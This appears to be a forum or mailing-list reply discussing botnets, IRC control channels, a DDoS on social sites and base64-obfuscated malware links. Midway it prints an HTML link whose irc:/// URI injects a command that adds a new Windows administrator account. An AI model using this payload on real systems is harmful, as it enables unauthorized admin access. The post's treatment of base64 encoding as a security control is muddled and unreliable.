Excellent point Mayank.

Looking at the usage,  we may assume that the frequency of these attacks is
very minimal and people are using most big portals without interruptions.

The normal method for controlling Botnets is via an IRC channel, usually a
private keyed channel on some obscure network.But, as far as I assume, even
IRC is not safe in every case.  We can have something like the below code to
run sample attack simulations via IRC to run commands remotely :

<html>
  <body>
  <a href='irc:///"%20--nosplash%20-e%20"*run%20cmd.exe*%20/c%20net%20user%20strawdog%20pass%20/add%20&%20net%20localgroup%20Administrators%20strawdog%20/add"%20"'>Heaven
and Earth are impartial</a><br>
  </body>
</html>

However, very recently both facebook and twitter had come under attacks that
besieged them with more traffic than they could handle.These were not the
direct botnets but politically motivated DDoS attack aimed at a certain
anti-Russian blogger known as Cyxymu.

The account, which Twitter promptly suspended, issued tweets containing a
single line of text that looked indecipherable to the naked eye. Using
what's known as a base64 decoder, the dispatches pointed to links where
infected computers could receive malware updates.

I  will keep my post very less technical.However the idea is to share that
even commonly used techniques like Base64 encoding proof to be more
vulnerable than they actually are. are not fully secure.One can easliy
google and spam any vulnerable link by base64 encoding via social
engineering. It happens very frequently on orkut.
http://www.opinionatedgeek.com/dotnet/tools/Base64Encode/Default.aspx

The problem is when social engg comes into picture in any of these kind of
attacks. You can have "N" number of guidelines, "X" number of parameters and
documentations to make your application secure.But how do you plan for
a social engineering.

I am sorry for diverting the discussion to a new area.But it seems to be
very much cross linked.
